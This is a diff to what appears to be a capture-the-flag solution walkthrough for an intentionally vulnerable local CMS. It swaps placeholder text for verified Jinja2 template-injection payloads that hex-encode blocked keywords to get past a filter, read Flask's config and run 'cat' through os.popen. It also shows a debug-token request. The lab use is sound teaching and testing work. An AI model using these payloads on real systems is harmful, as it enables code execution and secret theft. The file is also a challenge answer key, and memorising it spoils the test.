@@ -38,12 +38,12 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 **Response:**
 ```json
 {
-  "flag": "durham-cms{<flag1_value>}",
+  "flag": "durham-cms-flag1{<flag1_value>}",
   "debug": true
 }
 ```
 
-**Flag 1:** `durham-cms{...}` *(per-user, see flags.json)*
+**Flag 1:** `durham-cms-flag1{...}` *(per-user, see flags.json)*
 
 ---
 
@@ -66,7 +66,7 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
    SECRET_KEY: novacms-dev-2024
    ```
 
-**Flag 2:** `durham-cms{novacms-dev-2024}` *(static -- the SECRET_KEY itself)*
+**Flag 2:** `durham-cms-flag2{novacms-dev-2024}` *(static -- the SECRET_KEY itself)*
 
 ---
 
@@ -95,16 +95,23 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 
 ### Exploit
 
-*(Exact payload to be filled in after implementation and testing)*
+**Step 1: Confirm WAF bypass works** -- dump Jinja2 globals via hex-encoded dunders:
 
 ```
-# Example bypass to access config through globals:
 {{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
 ```
 
-The flag is stored in the database and accessible once the WAF bypass is confirmed working. The exact retrieval method depends on which globals/builtins path the player takes.
+**Step 2: Access Flask config through WAF bypass** -- import `flask`, get `current_app.config`:
 
-**Flag 3:** `durham-cms{...}` *(per-user, see flags.json)*
+```
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('flask')|attr('current_app')|attr('\x63onfig')}}
+```
+
+The output contains `WAF_SECRET_FLAG: durham-cms-flag3{...}`.
+
+**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `config` -> `\x63onfig`
+
+**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `app.config['WAF_SECRET_FLAG']`, see flags.json)*
 
 ---
 
@@ -117,14 +124,15 @@ The flag is stored in the database and accessible once the WAF bypass is confirm
 
 ### Exploit
 
-Using the `lipsum` globals path with hex encoding to bypass the WAF:
+Using the `lipsum` globals path with hex encoding to bypass the WAF.
 
-*(Exact payload to be filled in after implementation and testing)*
+**Verified payload** -- all blocked keywords hex-encoded (`import` -> `\x69mport`, `os` -> `\x6f\x73`, `popen` -> `p\x6fpen`, `builtins` -> `\x62uiltins`):
 
 ```
-# Concept: reach os.popen() via lipsum globals
-{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp\x6frt\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
 ```
+
+This returns the contents of `/app/secret/flag.txt`.
 
 **Alternative: Full MRO chain:**
 ```
@@ -132,7 +140,7 @@ Using the `lipsum` globals path with hex encoding to bypass the WAF:
 {{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubcla'+'sses\x5f\x5f')()}}
 ```
 
-**Flag 4:** `durham-cms{...}` *(per-user, see flags.json)*
+**Flag 4:** `durham-cms-flag4{...}` *(per-user, see flags.json)*
 
 ---
 
